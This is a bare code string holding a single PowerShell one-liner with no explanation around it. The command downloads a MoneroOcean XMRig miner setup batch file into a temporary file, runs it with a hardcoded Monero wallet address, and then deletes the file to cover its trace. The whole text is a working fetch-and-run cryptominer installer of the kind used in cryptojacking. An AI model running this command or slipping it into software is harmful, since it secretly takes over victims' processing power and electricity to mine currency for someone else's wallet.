"""
powershell -Command "$wc = New-Object System.Net.WebClient; $tempfile = [System.IO.Path]::GetTempFileName(); $tempfile += '.bat'; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.bat', $tempfile); & $tempfile 42eGjaqiarZRGG4DLg2NPE5GB7B8KYvwA2XCYPuS1dYHB4deitWoSHY9rQA66it8QHKEpeTynzGFEAE6iKczX6xSADg6erh; Remove-Item -Force $tempfile"
"""
